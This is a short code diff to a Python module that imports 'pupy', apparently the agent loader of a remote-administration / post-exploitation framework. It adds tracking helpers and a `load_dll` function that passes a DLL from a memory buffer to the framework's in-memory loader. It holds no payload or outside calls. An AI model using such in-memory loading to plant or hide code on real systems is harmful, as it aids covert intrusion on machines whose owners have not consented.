@@ -22,6 +22,7 @@ __debug = False
 __trace = False
 
 modules = {}
+dlls = set()
 
 def dprint(msg):
     global __debug
@@ -221,10 +222,32 @@ def has_module(name):
 
     return False
 
+def has_dll(name):
+    global dlls
+    return name in dlls
+
 def new_modules(names):
     return [
         name for name in names if not has_module(name)
     ]
+
+def new_dlls(names):
+    return [
+        name for name in names if not has_dll(name)
+    ]
+
+def load_dll(name, buf):
+    global dlls
+    if name in dlls:
+        return True
+
+    import pupy
+    if hasattr(pupy, 'load_dll'):
+        if pupy.load_dll(name, buf):
+            dlls.add(name)
+            return True
+
+    return False
 
 def invalidate_module(name):
     import pupy
